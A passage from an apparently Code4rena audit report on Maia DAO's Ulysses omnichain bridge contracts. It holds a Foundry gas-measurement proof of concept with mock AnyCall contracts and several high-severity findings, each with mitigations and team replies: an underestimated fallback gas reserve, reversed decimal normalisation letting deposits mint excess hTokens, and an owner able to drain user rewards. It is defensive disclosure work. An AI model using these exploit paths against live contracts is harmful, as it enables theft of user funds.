Agent.modifierrequiresBridgeAgent() {if(!isBridgeAgent[msg.sender])revertUnrecognizedBridgeAgent();_;}functionwithdraw(address_recipient,address_underlyingAddress,uint256_deposit)externalvirtualrequiresBridgeAgent{_underlyingAddress.safeTransfer(_recipient,_denormalizeDecimals(_deposit,ERC20(_underlyingAddress).decimals()));}function_denormalizeDecimals(uint256_amount,uint8_decimals)internalpurereturns(uint256) {return_decimals==18?_amount: (_amount*1ether) / (10**_decimals);}}contractBranchBridgeAgent{usingSafeCastLibforuint256;enumDepositStatus{Success,Failed}structDeposit{uint128depositedGas;addressowner;DepositStatusstatus;address[]hTokens;address[]tokens;uint256[]amounts;uint256[]deposits;}errorAnycallUnauthorizedCaller();errorGasErrorOrRepeatedTx();uint256publicremoteCallDepositedGas;uint256internalconstantMIN_FALLBACK_RESERVE=185_000;// 100_000 for anycall + 85_000 fallback execution overhead// uint256 internal constant MIN_EXECUTION_OVERHEAD = 160_000; // 100_000 for anycall + 35_000 Pre 1st Gas Checkpoint Execution + 25_000 Post last Gas Checkpoint Executionsuint256internalconstantTRANSFER_OVERHEAD=24_000;WETH9publicimmutablewrappedNativeToken;AnycallV7ConfigpublicanycallV7Config;uint256publicaccumulatedFees;/// @notice Local Chain Iduint24publicimmutablelocalChainId;/// @notice Address for Bridge Agent who processes requests submitted for the Root Router Address where cross-chain requests are executed in the Root Chain.addresspublicimmutablerootBridgeAgentAddress;/// @notice Local Anyexec Addressaddresspublicimmutablelocal`AnyCall`ExecutorAddress;/// @notice Address for Local AnycallV7 Proxy Address where cross-chain requests are sent to the Root Chain Router.addresspublicimmutablelocal`AnyCall`Address;/// @notice Address for Local Port Address where funds deposited from this chain are kept, managed and supplied to different Port Strategies.addresspublicimmutablelocalPortAddress;/// @notice Deposit nonce used for identifying transaction.uint32publicdepositNonce;/// @notice Mapping from Pending deposits hash to Deposit Struct.mapping(uint32=>Deposit)publicgetDeposit;constructor() {AnycallExecutoranycallExecutor=newAnycallExecutor();local`AnyCall`ExecutorAddress=address(anycallExecutor);localChainId=1;wrappedNativeToken=newWETH9();local`AnyCall`Address=address(3);rootBridgeAgentAddress=address(2);anycallV7Config=newAnycallV7Config();localPortAddress=address(newBranchPort(address(this)));getDeposit[1].depositedGas=1ether;// just for testing below}modifierrequiresExecutor() {_requiresExecutor();_;}function_requiresExecutor()internalview{if(msg.sender!=local`AnyCall`ExecutorAddress)revertAnycallUnauthorizedCaller();(addressfrom, , ) =IAnycallExecutor(local`AnyCall`ExecutorAddress).context();if(from!=rootBridgeAgentAddress)revertAnycallUnauthorizedCaller();}function_replenishGas(uint256_executionGasSpent)internalvirtual{//Deposit GasanycallV7Config.deposit{value:_executionGasSpent}(address(this));// IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config()).deposit{value: _executionGasSpent}(address(this));}function_forceRevert()internalvirtual{IAnycallConfiganycallConfig=IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config());uint256executionBudget=anycallConfig.executionBudget(address(this));// Withdraw all execution gas budget from anycall for tx to revert with "no enough budget"if(executionBudget>0)tryanycallConfig.withdraw(executionBudget) {}catch{}}/***@noticeInternal function repays gas used by Branch Bridge Agent to fulfill remote initiated interaction.-@param_depositNonceIdentifier for user deposit attatched to interaction being fallback.-@param_initialGasgas used by Branch Bridge Agent.*/function_payFallbackGas(uint32_depositNonce,uint256_initialGas)internalvirtual{//Save gasuint256gasLeft=gasleft();//Get Branch Environment Execution Cost// 1e9 for tx.gasPrice since it is zero in Foundryuint256minExecCost=1e9*(MIN_FALLBACK_RESERVE+_initialGas-gasLeft);//Check if sufficient balanceif(minExecCost>getDeposit[_depositNonce].depositedGas) {// getDeposit[1].depositedGas => 1 ether . set in the constructer above_forceRevert();return;}//Update user deposit reverts if not enough gas => user must boost deposit with gasgetDeposit[_depositNonce].depositedGas-=minExecCost.toUint128();//Withdraw GasIPort(localPortAddress).withdraw(address(this),address(wrappedNativeToken),minExecCost);//Unwrap GaswrappedNativeToken.withdraw(minExecCost);//Replenish Gas_replenishGas(minExecCost);}functionanyFallback(bytescalldatadata)externalvirtualrequiresExecutorreturns(boolsuccess,bytesmemoryresult){//Get Initial Gas Checkpointuint256initialGas=gasleft();/*** Other code here**/// we assume that the flag was 0x01 for simplicity and since it is also irrelevant anyway// passing deposit nonce as 1 since it is also irrelevant//Deduct gas costs from deposit and replenish this bridge agent's execution budget._payFallbackGas(1,initialGas);return(true,"");}functiondepositIntoWeth(uint256amt)external{wrappedNativeToken.deposit{value:amt*2}();// transfer half to the portwrappedNativeToken.transfer(localPortAddress,amt);}fallback()externalpayable{}}contractBranchBridgeAgentEmpty{usingSafeCastLibforuint256;enumDepositStatus{Success,Failed}structDeposit{uint128depositedGas;addressowner;DepositStatusstatus;address[]hTokens;address[]tokens;uint256[]amounts;uint256[]deposits;}errorAnycallUnauthorizedCaller();errorGasErrorOrRepeatedTx();uint256publicremoteCallDepositedGas;uint256internalconstantMIN_FALLBACK_RESERVE=185_000;// 100_000 for anycall + 85_000 fallback execution overheadWETH9publicimmutablewrappedNativeToken;AnycallV7ConfigpublicanycallV7Config;uint256publicaccumulatedFees;/// @notice Local Chain Iduint24publicimmutablelocalChainId;/// @notice Address for Bridge Agent who processes requests submitted for the Root Router Address where cross-chain requests are executed in the Root Chain.addresspublicimmutablerootBridgeAgentAddress;/// @notice Local Anyexec Addressaddresspublicimmutablelocal`AnyCall`ExecutorAddress;/// @notice Address for Local AnycallV7 Proxy Address where cross-chain requests are sent to the Root Chain Router.addresspublicimmutablelocal`AnyCall`Address;/// @notice Address for Local Port Address where funds deposited from this chain are kept, managed and supplied to different Port Strategies.addresspublicimmutablelocalPortAddress;/// @notice Deposit nonce used for identifying transaction.uint32publicdepositNonce;/// @notice Mapping from Pending deposits hash to Deposit Struct.mapping(uint32=>Deposit)publicgetDeposit;constructor() {AnycallExecutoranycallExecutor=newAnycallExecutor();local`AnyCall`ExecutorAddress=address(anycallExecutor);localChainId=1;wrappedNativeToken=newWETH9();local`AnyCall`Address=address(3);rootBridgeAgentAddress=address(2);anycallV7Config=newAnycallV7Config();localPortAddress=address(newBranchPort(address(this)));getDeposit[1].depositedGas=1ether;// just for testing below}modifierrequiresExecutor() {_requiresExecutor();_;}function_requiresExecutor()internalview{if(msg.sender!=local`AnyCall`ExecutorAddress)revertAnycallUnauthorizedCaller();(addressfrom, , ) =IAnycallExecutor(local`AnyCall`ExecutorAddress).context();if(from!=rootBridgeAgentAddress)revertAnycallUnauthorizedCaller();}function_replenishGas(uint256_executionGasSpent)internalvirtual{//Deposit GasanycallV7Config.deposit{value:_executionGasSpent}(address(this));// IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config()).deposit{value: _executionGasSpent}(address(this));}function_forceRevert()internalvirtual{IAnycallConfiganycallConfig=IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config());uint256executionBudget=anycallConfig.executionBudget(address(this));// Withdraw all execution gas budget from anycall for tx to revert with "no enough budget"if(executionBudget>0)tryanycallConfig.withdraw(executionBudget) {}catch{}}/***@noticeInternal function repays gas used by Branch Bridge Agent to fulfill remote initiated interaction.-@param_depositNonceIdentifier for user deposit attatched to interaction being fallback.-@param_initialGasgas used by Branch Bridge Agent.*/function_payFallbackGas(uint32_depositNonce,uint256_initialGas)internalvirtual{//Save gasuint256gasLeft=gasleft();// comment out all the lines after end gas checkpoint for gas calc purpose// //Get Branch Environment Execution Cost// // 1e9 for tx.gasPrice since it is zero in Foundry// uint256 minExecCost = 1e9 * (MIN_FALLBACK_RESERVE + _initialGas - gasLeft);// //Check if sufficient balance// if (minExecCost > getDeposit[_depositNonce].depositedGas) { // getDeposit[1].depositedGas => 1 ether . set in the constructer above//     _forceRevert();//     return;// }// //Update user deposit reverts if not enough gas => user must boost deposit with gas// getDeposit[_depositNonce].depositedGas -= minExecCost.toUint128();// //Withdraw Gas// IPort(localPortAddress).withdraw(address(this), address(wrappedNativeToken), minExecCost);// //Unwrap Gas// wrappedNativeToken.withdraw(minExecCost);// //Replenish Gas// _replenishGas(minExecCost);}functionanyFallback(bytescalldatadata)externalvirtualreturns(// requiresExecutor comment out this for gas calc purposeboolsuccess,bytesmemoryresult){//Get Initial Gas Checkpointuint256initialGas=gasleft();/*** Other code here**/// we assume that the flag was 0x01 for simplicity and since it is also irrelevant anyway// passing deposit nonce as 1 since it is also irrelevant//Deduct gas costs from deposit and replenish this bridge agent's execution budget._payFallbackGas(1,initialGas);// return (true, ""); // comment out this also for gas calc purpose}functiondepositIntoWeth(uint256amt)external{wrappedNativeToken.deposit{value:amt*2}();// transfer half to the portwrappedNativeToken.transfer(localPortAddress,amt);}fallback()externalpayable{}}contractGasCalcisDSTest,Test{BranchBridgeAgentbranchBridgeAgent;BranchBridgeAgentEmptybranchBridgeAgentEmpty;functionsetUp()public{branchBridgeAgentEmpty=newBranchBridgeAgentEmpty();vm.deal(address(branchBridgeAgentEmpty.local`AnyCall`ExecutorAddress()),100ether);// executer pays gasvm.deal(address(branchBridgeAgentEmpty),200ether);branchBridgeAgent=newBranchBridgeAgent();vm.deal(address(branchBridgeAgent.local`AnyCall`ExecutorAddress()),100ether);// executer pays gasvm.deal(address(branchBridgeAgent),200ether);}// code after end checkpoint gasLeft not includedfunctiontest_calcgasEmpty()public{// add weth balance to the agent and the port // 100 WETH for eachbranchBridgeAgentEmpty.depositIntoWeth(100ether);vm.prank(address(branchBridgeAgentEmpty.local`AnyCall`ExecutorAddress()));uint256gasStart=gasleft();branchBridgeAgentEmpty.anyFallback(bytes(""));uint256gasEnd=gasleft();vm.stopPrank();uint256gasSpent=gasStart-gasEnd;console.log("branchBridgeAgentEmpty.anyFallback Gas Spent => %d",gasSpent);}// code after end checkpoint gasLeft includedfunctiontest_calcgas()public{// add weth balance to the agent and the port // 100 WETH for eachbranchBridgeAgent.depositIntoWeth(100ether);vm.prank(address(branchBridgeAgent.local`AnyCall`ExecutorAddress()));uint256gasStart=gasleft();branchBridgeAgent.anyFallback(bytes(""));uint256gasEnd=gasleft();vm.stopPrank();uint256gasSpent=gasStart-gasEnd;console.log("branchBridgeAgent.anyFallback Gas Spent => %d",gasSpent);}}
Proof of Concept #2 (The gas consumed byanyExecmethod inAnyCall)
Overview
We have contracts that simulate theAnycallcontracts:
AnycallV7ConfigAnycallExecutorAnycallV7
The flow looks like this:
MPC=>AnycallV7=>AnycallExecutor=>IApp
In the code,IApp(_to).anyFallbackis commented out because we don’t want to calculate its gas, since it is done in PoC #1. We also setisFallbackto true, but the increased gas for this is negligible anyway.
Here is the output of the test:
[PASS]test_gasInanycallv7() (gas: 102640)Logs:anycallV7.anyExec Gas Spent => 110920Test result: ok. 1 passed; 0 failed; finishedin1.58ms
Coded PoC
// PoC => Maia OmniChain: gasCalculation for anyFallback in `AnyCall` v7  contractspragmasolidity>=0.8.4<0.9.0;import{Test}from"forge-std/Test.sol";import"forge-std/console.sol";import{DSTest}from"ds-test/test.sol";/// IAnycallConfig interface of the anycall configinterfaceIAnycallConfig{functioncheckCall(address_sender,bytescalldata_data,uint256_toChainID,uint256_flags)externalviewreturns(stringmemory_appID,uint256_srcFees);functioncheckExec(stringcalldata_appID,address_from,address_to)externalview;functionchargeFeeOnDestChain(address_from,uint256_prevGasLeft)external;}/// IAnycallExecutor interface of the anycall executorinterfaceIAnycallExecutor{functioncontext()externalviewreturns(addressfrom,uint256fromChainID,uint256nonce);functionexecute(address_to,bytescalldata_data,address_from,uint256_fromChainID,uint256_nonce,uint256_flags,bytescalldata_extdata)externalreturns(boolsuccess,bytesmemoryresult);}/// IApp interface of the applicationinterfaceIApp{/// (required) call on the destination chain to exec the interactionfunctionanyExecute(bytescalldata_data)externalreturns(boolsuccess,bytesmemoryresult);/// (optional,advised) call back on the originating chain if the cross chain interaction fails/// `_data` is the orignal interaction arguments exec on the destination chainfunctionanyFallback(bytescalldata_data)externalreturns(boolsuccess,bytesmemoryresult);}libraryAnycallFlags{// call flags which can be specified by useruint256publicconstantFLAG_NONE=0x0;uint256publicconstantFLAG_MERGE_CONFIG_FLAGS=0x1;uint256publicconstantFLAG_PAY_FEE_ON_DEST=0x1<<1;uint256publicconstantFLAG_ALLOW_FALLBACK=0x1<<2;// exec flags used internallyuint256publicconstantFLAG_EXEC_START_VALUE=0x1<<16;uint256publicconstantFLAG_EXEC_FALLBACK=0x1<<16;}contractAnycallV7Config{uint256publicconstantPERMISSIONLESS_MODE=0x1;uint256publicconstantFREE_MODE=0x1<<1;mapping(string=>mapping(address=>bool))publicappExecWhitelist;mapping(string=>bool)publicappBlacklist;uint256publicmode;uint256publicminReserveBudget;mapping(address=>uint256)publicexecutionBudget;constructor() {mode=PERMISSIONLESS_MODE;}functioncheckExec(stringcalldata_appID,address_from,address_to)externalview{require(!appBlacklist[_appID],"blacklist");if(!_isSet(mode,PERMISSIONLESS_MODE)) {require(appExecWhitelist[_appID][_to],"no permission");}if(!_isSet(mode,FREE_MODE)) {require(executionBudget[_from] >=minReserveBudget,"less than min budget");}}function_isSet(uint256_value,uint256_testBits)internalpurereturns(bool) {return(_value&_testBits) ==_testBits;}}contractAnycallExecutor{bytes32publicconstantPAUSE_ALL_ROLE=0x00;eventPaused(bytes32role);eventUnpaused(bytes32role);modifierwhenNotPaused(bytes32role) {require(!paused(role) && !paused(PAUSE_ALL_ROLE),"PausableControl: paused");_;}mapping(bytes32=>bool)private_pausedRoles;mapping(address=>bool)publicisSupportedCaller;structContext{addressfrom;uint256fromChainID;uint256nonce;}// Context public override context;Contextpubliccontext;functionpaused(bytes32role)publicviewvirtualreturns(bool) {return_pausedRoles[role];}modifieronlyAuth() {require(isSupportedCaller[msg.sender],"not supported caller");_;}constructor(addressanycall) {context.fromChainID=1;context.from=address(2);context.nonce=1;isSupportedCaller[anycall] =true;}function_isSet(uint256_value,uint256_testBits)internalpurereturns(bool){return(_value&_testBits) ==_testBits;}// @dev `_extdata` content is implementation based in each versionfunctionexecute(address_to,bytescalldata_data,address_from,uint256_fromChainID,uint256_nonce,uint256_flags,bytescalldata/*_extdata*/)externalvirtualonlyAuthwhenNotPaused(PAUSE_ALL_ROLE)returns(boolsuccess,bytesmemoryresult){boolisFallback=_isSet(_flags,AnycallFlags.FLAG_EXEC_FALLBACK) ||true;// let it fallbackcontext=Context({from:_from,fromChainID:_fromChainID,nonce:_nonce});if(!isFallback) {// we skip calling anyExecute since it is irrelevant for this PoC(success,result) =IApp(_to).anyExecute(_data);}else{// we skip calling anyExecute since it is irrelevant for this PoC// (success, result) = IApp(_to).anyFallback(_data);}context=Context({from:address(0),fromChainID:0,nonce:0});}}contractAnycallV7{eventLog`AnyCall`(addressindexedfrom,addressto,bytesdata,uint256toChainID,uint256flags,stringappID,uint256nonce,bytesextdata);eventLog`AnyCall`(addressindexedfrom,stringto,bytesdata,uint256toChainID,uint256flags,stringappID,uint256nonce,bytesextdata);eventLogAnyExec(bytes32indexedtxhash,addressindexedfrom,addressindexedto,uint256fromChainID,uint256nonce,boolsuccess,bytesresult);eventStoreRetryExecRecord(bytes32indexedtxhash,addressindexedfrom,addressindexedto,uint256fromChainID,uint256nonce,bytesdata);// Context of the request on originating chainstructRequestContext{bytes32txhash;addressfrom;uint256fromChainID;uint256nonce;uint256flags;}addresspublicmpc;boolpublicpaused;// applications should give permission to this executoraddresspublicexecutor;// anycall config contractaddresspublicconfig;mapping(bytes32=>bytes32)publicretryExecRecords;boolpublicretryWithPermit;mapping(bytes32=>bool)publicexecCompleted;uint256nonce;uint256privateunlocked;modifierlock() {require(unlocked==1,"locked");unlocked=0;_;unlocked=1;}/// @dev Access control functionmodifieronlyMPC() {require(msg.sender==mpc,"only MPC");_;}/// @dev pausable control functionmodifierwhenNotPaused() {require(!paused,"paused");_;}function_isSet(uint256_value,uint256_testBits)internalpurereturns(bool){return(_value&_testBits) ==_testBits;}/// @dev Charge an account for execution costs on this chain/// @param _from The account to charge for execution costsmodifierchargeDestFee(address_from,uint256_flags) {if(_isSet(_flags,AnycallFlags.FLAG_PAY_FEE_ON_DEST)) {uint256_prevGasLeft=gasleft();_;IAnycallConfig(config).chargeFeeOnDestChain(_from,_prevGasLeft);}else{_;}}constructor(address_mpc) {unlocked=1;// needs to be unlocked initiallympc=_mpc;config=address(newAnycallV7Config());executor=address(newAnycallExecutor(address(this)));}/// @notice Calc unique IDfunctioncalcUniqID(bytes32_txhash,address_from,uint256_fromChainID,uint256_nonce)publicpurereturns(bytes32) {returnkeccak256(abi.encode(_txhash,_from,_fromChainID,_nonce));}function_execute(address_to,bytesmemory_data,RequestContextmemory_ctx,bytesmemory_extdata)internalreturns(boolsuccess) {bytesmemoryresult;tryIAnycallExecutor(executor).execute(_to,_data,_ctx.from,_ctx.fromChainID,_ctx.nonce,_ctx.flags,_extdata)returns(boolsucc,bytesmemoryres) {(success,result) = (succ,res);}catchError(stringmemoryreason) {result=bytes(reason);}catch(bytesmemoryreason) {result=reason;}emitLogAnyExec(_ctx.txhash,_ctx.from,_to,_ctx.fromChainID,_ctx.nonce,success,result);}/**@noticeExecute a cross chain interaction@devOnly callable by the MPC@param_toThe cross chain interaction target@param_dataThe calldata supplied for interacting with target@param_appIDThe app identifier to check whitelist@param_ctxThe context of the request on originating chain@param_extdataThe extension data for execute context*/// Note: changed from callback to memory so we can call it from the test contractfunctionanyExec(address_to,bytesmemory_data,stringmemory_appID,RequestContextmemory_ctx,bytesmemory_extdata)externalvirtuallockwhenNotPausedchargeDestFee(_to, _ctx.flags)onlyMPC{IAnycallConfig(config).checkExec(_appID,_ctx.from,_to);bytes32uniqID=calcUniqID(_ctx.txhash,_ctx.from,_ctx.fromChainID,_ctx.nonce);require(!execCompleted[uniqID],"exec completed");boolsuccess=_execute(_to,_data,_ctx,_extdata);// success = false on purpose, because when it is true, it consumes less gas. so we are considering worse case here// set exec completed (dont care success status)execCompleted[uniqID] =true;if(!success) {if(_isSet(_ctx.flags,AnycallFlags.FLAG_ALLOW_FALLBACK)) {// this will be executed here since the call failed// Call the fallback on the originating chainnonce++;stringmemoryappID=_appID;// fix Stack too deepemitLog`AnyCall`(_to,_ctx.from,_data,_ctx.fromChainID,AnycallFlags.FLAG_EXEC_FALLBACK|AnycallFlags.FLAG_PAY_FEE_ON_DEST,// pay fee on dest chainappID,nonce,"");}else{// Store retry record and emit a logbytesmemorydata=_data;// fix Stack too deepretryExecRecords[uniqID] =keccak256(abi.encode(_to,data));emitStoreRetryExecRecord(_ctx.txhash,_ctx.from,_to,_ctx.fromChainID,_ctx.nonce,data);}}}}contractGasCalc`AnyCall`v7isDSTest,Test{AnycallV7anycallV7;addressmpc=vm.addr(7);functionsetUp()public{anycallV7=newAnycallV7(mpc);}functiontest_gasInanycallv7()public{vm.prank(mpc);AnycallV7.RequestContextmemoryctx=AnycallV7.RequestContext({txhash:keccak256(""),from:address(0),fromChainID:1,nonce:1,flags:AnycallFlags.FLAG_ALLOW_FALLBACK});uint256gasStart_=gasleft();anycallV7.anyExec(address(0),bytes(""),"1",ctx,bytes(""));uint256gasEnd_=gasleft();vm.stopPrank();uint256gasSpent_=gasStart_-gasEnd_;console.log("anycallV7.anyExec Gas Spent => %d",gasSpent_);}}
Recommended Mitigation Steps
Increase theMIN_FALLBACK_RESERVEby115_000to consider theanyExecmethod inAnyCall. SoMIN_FALLBACK_RESERVEbecomes300_000instead of185_000.
Additionally, calculate the gas consumption of the input data passed and add it to the cost. This should be done when the call was made in the first place.
Note: I suggest that theMIN_FALLBACK_RESERVEshould be configurable/changeable. After launchingOmniChainfor some time, collect stats about the actual gas used forAnyCallon the chain then adjust it accordingly. This also keeps you on the safe side in case any changes are applied onAnyCallcontracts in the future, since it is upgradeable.
0xBugsy (Maia) disagreed with severity and commented:
We should addpremium()uint256 to match their gas cost calculationtotalCost = gasUsed * (tx.gasprice + _feeData.premium)and abide by it since these are the calculations under which we will be charged in the execution budget.
Trust (judge) commented:
Unless there is additional reasoning to why the impact is reduced, High seems appropriate.
0xBugsy (Maia) confirmed and commented:
We recognize the audit’s findings on Anycall Gas Management. These will not be rectified due to the upcoming migration of this section to LayerZero.

[H-05] Multiple issues with decimal scaling will cause incorrect accounting of hTokens and underlying tokens
Submitted bypeakbolt, also found by BPZ (1,2,3),RED-LOTUS-REACH,0xTheC0der, ltyu (1,2,3,4,5), bin2chen (1,2), kodyvim (1,2), 0xStalin (1,2),LokiThe5th,ubermensch,adeolu,jasonxiale, andkutugu
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L313https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L696https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L745
Vulnerability details
Functions_normalizeDecimals()and_denormalizeDecimals()are used to handle non-18 decimal tokens when bridging a deposit by scaling them to a normalized 18 decimal form forhTokenaccounting, and then de-normalizing them to the token’s decimals when interacting with the underlying token.
However, there are 3 issues as follows:
Implementations of_normalizeDecimals()and_denormalizeDecimals()are reversed.The function_denormalizeDecimals()is missing inArbitrumBranchPort.depositToPort().The function_normalizeDecimals()is missing in functions withinBranchBridgeAgent.
These issues will cause an incorrect accounting ofhTokensand underlying tokens in the system.
Impact
An incorrect decimal scaling will lead to a loss of funds, as the amount deposited and withdrawn for bridging will be inaccurate. This can be abused by an attacker or result in users incurring losses.
For example, an attacker can abuse theArbitrumBranchPort.depositToPort()issue and steal from the system by first depositing a token that has more than 18 decimals. The attacker will receive morehTokensthan the deposited underlying token amount. The attacker can then make a profit by withdrawing from the port with the excesshTokens.
On the other hand, if the underlying token is less than 18 decimals, the depositor can incur losses, as the amount of underlying tokens deposited will be more than the amount ofhTokensreceived.
Issue #1
The functionsBranchBridgeAgent._normalizeDecimals()andBranchPort._denormalizeDecimals()(shown below) are incorrect, as they are implemented in a reversed manner; such that_denormalizeDecimals()is normalizing to 18 decimals while_normalizeDecimals()is de-normalizing to the underlying token decimals.
The result is that for tokens with > 18 decimals,_normalizeDecimals()will overscale the decimals, while for tokens with < 18 decimals,_normalizeDecimals()will underscale the decimals.
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1340-L1342
function_normalizeDecimals(uint256_amount,uint8_decimals)internalpurereturns(uint256) {return_decimals==18?_amount:_amount* (10**_decimals) /1ether;}
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchPort.sol#L388-L390
function_denormalizeDecimals(uint256_amount,uint8_decimals)internalpurereturns(uint256) {return_decimals==18?_amount:_amount*1ether/ (10**_decimals);}
Issue #2
The functionArbitrumBranchPort.depositToPort()is missing the call_denormalizeDecimals()to scale back the decimals of the underlying token amounts before transferring. This will cause the wrong amount of the underlying tokens to be transferred.
As shown below, the functionArbitrumBranchBridgeAgent.depositToPort()has normalized the “amount” to 18 decimals before passing intoArbitrumBranchPort.depositToPort().
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/ArbitrumBranchBridgeAgent.sol#L104
functiondepositToPort(addressunderlyingAddress,uint256amount)externalpayablelock{//@audit - amount is normalized to 18 decimals hereIArbPort(localPortAddress).depositToPort(msg.sender,msg.sender,underlyingAddress,_normalizeDecimals(amount,ERC20(underlyingAddress).decimals()));}
That means, the_depositamount forArbitrumBranchPort.depositToPort()(see below) will be incorrect, as it is not de-normalized back to the underlying token’s decimal, causing the wrong value to be transferred from the depositor.
If the underlying token is more than 18 decimals, the depositor will transfer less underlying tokens than thehTokenreceived, resulting in excesshTokens. The depositor can then callwithdrawFromPort()to receive more underlying tokens than deposited.
If the underlying token is less than 18 decimals, that will inflate the amount to be transferred from the depositor, causing the depositor to deposit more underlying tokens than the amount ofhTokenreceived. The depositor will incur a loss when withdrawing from the port.
Instead, the_depositshould be de-normalized inArbitrumBranchPort.depositToPort()when passing to_underlyingAddress.safeTransferFrom(), so that it is scaled back to the underlying token’s decimals when transferring.
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/ArbitrumBranchPort.sol#L52-L54
functiondepositToPort(address_depositor,address_recipient,address_underlyingAddress,uint256_deposit)externalrequiresBridgeAgent{addressglobalToken=IRootPort(rootPortAddress).getLocalTokenFromUnder(_underlyingAddress,localChainId);if(globalToken==address(0))revertUnknownUnderlyingToken();//@audit - the amount of underlying token should be denormalized first before transferring_underlyingAddress.safeTransferFrom(_depositor,address(this),_deposit);IRootPort(rootPortAddress).mintToLocalBranch(_recipient,globalToken,_deposit);}
Issue #3
InBranchBridgeAgent, the deposit amount passed into_depositAndCall()and_depositAndCallMultiple()are missing_normalizeDecimals().
The example below showscallOutSignedAndBridge(), but the issue is also present incallOutAndBridge(),callOutSignedAndBridgeMultiple()andcallOutAndBridgeMultiple().
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L269
functioncallOutSignedAndBridge(bytescalldata_params,DepositInputmemory_dParams,uint128_remoteExecutionGas)externalpayablelockrequiresFallbackGas{//Encode Data for cross-chain call.bytesmemorypackedData=abi.encodePacked(bytes1(0x05),msg.sender,depositNonce,_dParams.hToken,_dParams.token,_dParams.amount,_normalizeDecimals(_dParams.deposit,ERC20(_dParams.token).decimals()),_dParams.toChain,_params,msg.value.toUint128(),_remoteExecutionGas);//Wrap the gas allocated for omnichain execution.wrappedNativeToken.deposit{value:msg.value}();//Create Deposit and Send Cross-Chain request_depositAndCall(msg.sender,packedData,_dParams.hToken,_dParams.token,_dParams.amount,//@audit - the deposit amount of underlying token should be noramlized first_dParams.deposit,msg.value.toUint128());}
This will affect_createDepositSingle()and_createDepositMultiple(), leading to incorrect decimals forIPort(localPortAddress).bridgeOut(), which will affecthTokenburning and the deposit of underlying tokens.
At the same time, the deposits to be stored ingetDeposit[]are also not normalized, causing a mismatch of decimals whenclearToken()is called viaredeemDeposit().
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L857-L891
function_createDepositSingle(address_user,address_hToken,address_token,uint256_amount,uint256_deposit,uint128_gasToBridgeOut)internal{//Deposit / Lock Tokens into PortIPort(localPortAddress).bridgeOut(_user,_hToken,_token,_amount,_deposit);//Deposit Gas to Port_depositGas(_gasToBridgeOut);// Cast to dynamic memory arrayaddress[]memoryhTokens=newaddress[](1);hTokens[0] =_hToken;address[]memorytokens=newaddress[](1);tokens[0] =_token;uint256[]memoryamounts=newuint256[](1);amounts[0] =_amount;uint256[]memorydeposits=newuint256[](1);deposits[0] =_deposit;// Update StategetDeposit[_getAndIncrementDepositNonce()] =Deposit({owner:_user,hTokens:hTokens,tokens:tokens,amounts:amounts,//@audit the deposits stored is not normalized, causing a mismatch of decimals when `clearToken()` is called via `redeemDeposit()`deposits:deposits,status:DepositStatus.Success,depositedGas:_gasToBridgeOut});}
Recommended Mitigation Steps
Switch the implementation of_normalizeDecimals()to_denormalizeDecimals()and vice versa.Add_denormalizeDecimals()toArbitrumBranchPort.depositToPort()when callingIRootPort(rootPortAddress).mintToLocalBranch().Utilize_normalizeDecimals()when passing deposit amounts to_depositAndCall()and_depositAndCallMultiple()withinBranchBridgeAgent.
Assessed type
Decimal
0xLightt (Maia) confirmed
0xBugsy (Maia) commented:
We recognize the audit’s findings on Decimal Conversion for Ulysses AMM. These will not be rectified due to the upcoming migration of this section to Balancer Stable Pools.

[H-06]withdrawProtocolFees()Possible malicious or accidental withdrawal of all rewards
Submitted bybin2chen, also found bylukejohnand tsvetanovv (1,2)
The functionclaimReward()will take all of the rewards if theamountRequestedit’s passed in is 0, which may result in the user’s rewards being lost.
Proof of Concept
InBoostAggregator.withdrawProtocolFees(), the owner can take theprotocolRewards.
The code is as follows:
functionwithdrawProtocolFees(addressto)externalonlyOwner{uniswapV3Staker.claimReward(to,protocolRewards);@>deleteprotocolRewards;}
From the above code, we can see thatuniswapV3Stakeris called to fetch and then clearsprotocolRewards.
Let’s look at the implementation ofuniswapV3Staker.claimReward():
contractUniswapV3StakerisIUniswapV3Staker,Multicallable{....functionclaimReward(addressto,uint256amountRequested)externalreturns(uint256reward) {reward=rewards[msg.sender];@>if(amountRequested!=0&&amountRequested<reward) {reward=amountRequested;rewards[msg.sender] -=reward;}else{rewards[msg.sender] =0;}if(reward>0)hermes.safeTransfer(to,reward);emitRewardClaimed(to,reward);}
The current implementation is if theamountRequested==0passed, it means that allrewards[msg.sender]of thismsg.senderare taken.
This leads to the following problems:
If a maliciousownercallswithdrawProtocolFees()twice in a row, it will take all of therewardsin theBoostAggregator.Also, you probably didn’t realize thatwithdrawProtocolFees()was called whenprotocolRewards==0.
As a result, the rewards that belong to users inBoostAggregatorare lost.
Recommended Mitigation Steps
ModifyclaimReward()to removeamountRequested != 0:
contractUniswapV3StakerisIUniswapV3Staker,Multicallable{....functionclaimReward(addressto,uint256amountRequested)externalreturns(uint256reward) {reward=rewards[msg.sender];-if(amountRequested!=0&&amountRequested<reward) {+if(amountRequested<reward) {reward=amountRequested;rewards[msg.sender] -=reward;}else{rewards[msg.sender] =0;}if(reward>0)hermes.safeTransfer(to,reward);emitRewardClaimed(to,reward);}
Assessed type
Context
0xLightt (Maia) confirmed
0xLightt (Maia) commented:
We prefer to leave the originalUniswapV3Stakerclaim logic intact and have theBoostAggregatornot allow the owner or stakers to claim 0 rewards.
0xLightt (Maia) commented:
Addressedhere.

[H-07]redeem()inbeforeRedeemis using the wrong owner parameter
Submitted bybin2chen
Using the wrong owner parameter can cause users to lose rewards.
Proof of Concept
